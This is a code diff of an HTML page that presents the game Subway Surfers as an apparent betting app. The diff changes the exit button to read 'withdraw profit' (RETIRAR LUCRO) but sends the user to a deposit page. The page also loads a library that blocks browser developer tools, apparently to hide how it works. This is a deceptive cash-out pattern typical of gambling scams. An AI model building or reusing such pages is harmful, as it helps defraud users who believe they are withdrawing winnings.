@@ -5,17 +5,21 @@
         const aposta = 5;
     </script>
     <meta charset="UTF-8">
+    <meta http-equiv="content-type" content="text/html; charset=UTF8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <meta name="viewport" content="height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui, viewport-fit=cover" />
+    <meta name="description" content="">
+
     <link rel="manifest" href="subwaysurfers.webmanifest">
     <link rel="icon" href="assets/images/app-icon-16.png" type="image/png">
     <link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/images/app-icon-114.png">
     <link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/images/app-icon-72.png">
     <link rel="apple-touch-icon-precomposed" sizes="57x57" href="assets/images/app-icon-57.png">
     <link rel="apple-touch-icon-precomposed" href="assets/images/app-icon-57.png">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <meta name="robots" content="noindex,nofollow" />
     <title>Subway Surfers Web</title>
     <style>
@@ -61,7 +65,6 @@
             60% { opacity: 1; }
             100% { opacity: 0; }
         }
-
         button#sair {
             position: absolute;
             display: none;
@@ -82,7 +85,23 @@
     </style>
 </head>
 <body>
-    <button id="sair">ENCERRAR APOSTA</button>
+    <button id="sair" onclick="redirecionarParaOutraPagina()">RETIRAR LUCRO</button>
+
+    <script>
+        function redirecionarParaOutraPagina() {
+         
+            window.location.href = '../deposito';
+        }
+    </script>
+    
+    
+    
+    
+  
+
+
+
+
     <script>
         window.NOSW = true;
         window.GAME_CONFIG = {
@@ -99,3 +118,4 @@
     <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
 </body>
 </html>
+
